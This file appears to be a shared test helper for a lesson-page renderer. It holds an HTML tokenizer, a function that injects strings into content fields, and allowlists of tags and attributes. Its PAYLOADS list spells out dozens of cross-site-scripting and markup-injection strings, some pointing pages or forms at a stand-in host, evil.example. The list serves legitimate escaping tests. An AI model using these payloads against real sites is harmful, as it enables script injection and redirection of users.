// Shared by the render tests (and by the player's security spec).
//
// `scan` is a small HTML tokenizer that follows the states of the real one for everything our
// output can contain: tags, the three attribute-value forms, comments, raw-text elements (script,
// style) and escapable raw-text elements (textarea, title). It exists so a test can ask "which
// elements and attributes would a browser see?" of a string, and so that markup smuggled in through
// a lesson field shows up as an extra tag or attribute instead of hiding inside a substring match.
import type { Published } from '../../src/core/types';

export interface Tag {
  name: string;
  closing: boolean;
  /** Attributes in source order, values entity-decoded. The first of a repeated name wins, as in a browser. */
  attrs: Map<string, string>;
  /** Text content, for raw-text and escapable raw-text elements only. */
  content?: string;
}

export interface Scanned {
  tags: Tag[];
  /** All character data outside tags, entity-decoded, concatenated in order. */
  text: string;
  comments: string[];
  doctype: string | null;
}

const NAMED: Record<string, string> = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: String.fromCharCode(0xa0) };

export function decodeEntities(s: string): string {
  return s.replace(/&(#x[0-9a-fA-F]+|#[0-9]+|[a-zA-Z]+);/g, (whole, body: string) => {
    if (body.startsWith('#x') || body.startsWith('#X')) return String.fromCodePoint(Number.parseInt(body.slice(2), 16));
    if (body.startsWith('#')) return String.fromCodePoint(Number.parseInt(body.slice(1), 10));
    return Object.hasOwn(NAMED, body) ? (NAMED[body] as string) : whole;
  });
}

const RAW = new Set(['script', 'style']);
const RCDATA = new Set(['textarea', 'title']);
const isSpace = (c: string | undefined): boolean => c === ' ' || c === '\n' || c === '\t' || c === '\f' || c === '\r';
const isAlpha = (c: string | undefined): boolean => c !== undefined && /[A-Za-z]/.test(c);

export function scan(html: string): Scanned {
  const out: Scanned = { tags: [], text: '', comments: [], doctype: null };
  const n = html.length;
  let i = 0;
  let text = '';
  const flush = (): void => {
    out.text += decodeEntities(text);
    text = '';
  };

  while (i < n) {
    const c = html[i] as string;
    if (c !== '<') {
      text += c;
      i++;
      continue;
    }
    const next = html[i + 1];
    if (next === '!') {
      flush();
      if (html.startsWith('<!--', i)) {
        const end = html.indexOf('-->', i + 4);
        out.comments.push(html.slice(i + 4, end === -1 ? n : end));
        i = end === -1 ? n : end + 3;
      } else {
        const end = html.indexOf('>', i);
        out.doctype = html.slice(i + 2, end === -1 ? n : end);
        i = end === -1 ? n : end + 1;
      }
      continue;
    }
    if (next === '?' || (next === '/' && !isAlpha(html[i + 2]))) {
      // A bogus comment: everything up to the next ">" is swallowed.
      flush();
      const end = html.indexOf('>', i);
      out.comments.push(html.slice(i, end === -1 ? n : end + 1));
      i = end === -1 ? n : end + 1;
      continue;
    }
    if (!isAlpha(next) && next !== '/') {
      text += c;
      i++;
      continue;
    }

    flush();
    const closing = next === '/';
    i += closing ? 2 : 1;
    let name = '';
    while (i < n && !isSpace(html[i]) && html[i] !== '/' && html[i] !== '>') name += html[i++];
    const tag: Tag = { name: name.toLowerCase(), closing, attrs: new Map() };

    // Attributes.
    for (;;) {
      while (i < n && (isSpace(html[i]) || html[i] === '/')) i++;
      if (i >= n || html[i] === '>') break;
      let attr = '';
      // A leading "=" is part of the name, as the tokenizer has it.
      if (html[i] === '=') attr += html[i++];
      while (i < n && !isSpace(html[i]) && html[i] !== '/' && html[i] !== '>' && html[i] !== '=') attr += html[i++];
      while (i < n && isSpace(html[i])) i++;
      let value = '';
      if (html[i] === '=') {
        i++;
        while (i < n && isSpace(html[i])) i++;
        const q = html[i];
        if (q === '"' || q === "'") {
          const end = html.indexOf(q, i + 1);
          value = html.slice(i + 1, end === -1 ? n : end);
          i = end === -1 ? n : end + 1;
        } else {
          while (i < n && !isSpace(html[i]) && html[i] !== '>') value += html[i++];
        }
      }
      const key = attr.toLowerCase();
      if (!tag.attrs.has(key)) tag.attrs.set(key, decodeEntities(value));
    }
    i++; // the ">"

    if (!closing && (RAW.has(tag.name) || RCDATA.has(tag.name))) {
      const close = new RegExp(`</${tag.name}(?=[\\s/>])`, 'i');
      const rest = html.slice(i);
      const m = close.exec(rest);
      const body = m ? rest.slice(0, m.index) : rest;
      tag.content = RCDATA.has(tag.name) ? decodeEntities(body) : body;
      i += body.length;
    }
    out.tags.push(tag);
  }
  flush();
  return out;
}

/** Every start tag with this name. */
export function elements(s: Scanned, name: string): Tag[] {
  return s.tags.filter((t) => !t.closing && t.name === name);
}

/** Strings that try to leave the place they were put. Each is harmless as text and dangerous as markup. */
export const PAYLOADS: readonly string[] = [
  '<script>window.__xss=1</script>',
  '</script><script>window.__xss=1</script>',
  '</ScRiPt ><sCrIpT>window.__xss=1</sCrIpT>',
  '<img src=x onerror=window.__xss=1>',
  '"><img src=x onerror=window.__xss=1>',
  "'><svg onload=window.__xss=1>",
  '" onmouseover="window.__xss=1" x="',
  "' onfocus='window.__xss=1' autofocus='",
  '" style="position:fixed;inset:0;background:red" x="',
  '"/><base href="https://evil.example/">',
  'javascript:window.__xss=1',
  'data:text/html,<script>window.__xss=1</script>',
  '</style><style>*{display:none}</style>',
  '<!--',
  '--><script>window.__xss=1</script>',
  '<!--<script>',
  '</textarea><script>window.__xss=1</script>',
  '</title><script>window.__xss=1</script>',
  '</dialog></main></section><script>window.__xss=1</script>',
  '<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>',
  '<a href="javascript:window.__xss=1">x</a>',
  '&lt;script&gt;window.__xss=1&lt;/script&gt;',
  '&#60;img src=x onerror=window.__xss=1&#62;',
  '&quot; onclick=&quot;window.__xss=1',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
  '<link rel=stylesheet href=https://evil.example/x.css>',
  '<math><mtext></table></math><img src onerror=window.__xss=1>',
  '<svg><script>window.__xss=1</script></svg>',
  '<details open ontoggle=window.__xss=1>',
  '<form action=https://evil.example><button>x</button></form>',
  '<input autofocus onfocus=window.__xss=1>',
  '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">',
  '<video src=https://evil.example/v.mp4 autoplay></video><audio src=https://evil.example/a.mp3 autoplay></audio>',
  '${window.__xss=1}',
  '{{constructor.constructor("window.__xss=1")()}}',
  '`<img src=x onerror=window.__xss=1>`',
  '**<b onclick=window.__xss=1>x</b>**',
  '*<i onmouseover=window.__xss=1>x</i>*',
  '$\\text{<img src=x onerror=window.__xss=1>}$',
  '$x^{</math><script>window.__xss=1</script>}$',
  '$\\frac{<script>}{</script>}$',
  `a${String.fromCharCode(0)}<script>window.__xss=1</script>`,
  `<scr${String.fromCharCode(0)}ipt>window.__xss=1</scr${String.fromCharCode(0)}ipt>`,
  `line${String.fromCharCode(0x2028)}separator${String.fromCharCode(0x2029)}<script>window.__xss=1</script>`,
  'x" popover id="lt-data',
  '__proto__',
  'constructor',
  'hasOwnProperty',
];

/** Keys whose values are identifiers, enumerations or addresses rather than prose. */
const STRUCTURAL = new Set([
  'id', 'type', 'kind', 'format', 'objective', 'cite', 'cites', 'basedOn', 'highlight', 'from', 'to', 'layout', 'mark', 'data', 'via', 'level', 'depth', 'language', 'lang',
  'url', 'host', 'savedOn', 'status', 'generator', 'version', 'rules', 'hash', 'validatedOn', 'weakClaims', 'segmentId', 'mime', 'base64', 'provider',
]);

export type Reach = 'prose' | 'strings' | 'everything';

/**
 * A copy of `published` with a payload written into its fields.
 *   prose       every free-text field; ids, enumerations and addresses stay valid, so every
 *               renderer path that depends on them still runs
 *   strings     every string, including ids, enumerations and the source address
 *   everything  every string, number and boolean
 * `fill` is given the path of each leaf and returns what to write there.
 */
export function poison(published: Published, reach: Reach, fill: (path: string) => string): Published {
  const walk = (value: unknown, path: string, structural: boolean): unknown => {
    if (typeof value === 'string') return structural && reach === 'prose' ? value : fill(path);
    if (typeof value === 'number' || typeof value === 'boolean') return reach === 'everything' ? fill(path) : value;
    if (Array.isArray(value)) return value.map((item, i) => walk(item, `${path}[${i}]`, structural));
    if (typeof value === 'object' && value !== null) {
      const out: Record<string, unknown> = {};
      for (const [key, child] of Object.entries(value)) out[key] = walk(child, path ? `${path}.${key}` : key, structural || STRUCTURAL.has(key));
      return out;
    }
    return value;
  };
  return walk(published, '', false) as Published;
}

/** Tags the renderer itself may write. Anything else in a rendered lesson came from somewhere it should not have. */
export const ALLOWED_TAGS = new Set([
  'html', 'head', 'meta', 'title', 'style', 'body', 'script',
  'a', 'header', 'main', 'footer', 'nav', 'section', 'div', 'p', 'span', 'h1', 'h2', 'h3',
  'ol', 'ul', 'li', 'dl', 'dt', 'dd', 'blockquote', 'cite', 'code', 'strong', 'em',
  'button', 'dialog', 'form', 'details', 'summary', 'textarea', 'label', 'fieldset', 'legend', 'input', 'audio',
  'table', 'caption', 'thead', 'tbody', 'tr', 'th', 'td',
  'svg', 'circle', 'path',
  'math', 'mrow', 'mi', 'mn', 'mo', 'mtext', 'mspace', 'msup', 'msub', 'msubsup', 'munder', 'mover', 'munderover', 'mfrac', 'msqrt', 'mroot',
]);

/** Attributes the renderer itself may write. */
export const ALLOWED_ATTRS = new Set([
  'lang', 'class', 'id', 'charset', 'http-equiv', 'content', 'name', 'type', 'href', 'target', 'rel', 'hidden', 'tabindex', 'role', 'popover', 'popovertarget', 'popovertargetaction',
  'for', 'readonly', 'rows', 'spellcheck', 'method', 'value', 'checked', 'preload', 'scope',
  // What a control needs in order to be typed into comfortably is part of the markup, not something the script adds later.
  'open', 'inputmode', 'autocomplete', 'autocapitalize', 'enterkeyhint',
  // A slider of an explore panel carries its range and where it starts (render/clip.ts); it is `hidden` until the player wakes it.
  'min', 'max', 'step',
  'viewbox', 'width', 'height', 'focusable', 'cx', 'cy', 'r', 'fill', 'stroke', 'stroke-width', 'stroke-linecap', 'stroke-linejoin', 'd',
  'display', 'mathvariant', 'fence', 'stretchy', 'separator', 'lspace', 'rspace', 'movablelimits', 'displaystyle', 'form', 'largeop', 'accent', 'accentunder',
]);

export function attrAllowed(name: string): boolean {
  return ALLOWED_ATTRS.has(name) || /^aria-[a-z]+$/.test(name) || /^data-[a-z][a-z-]*$/.test(name);
}
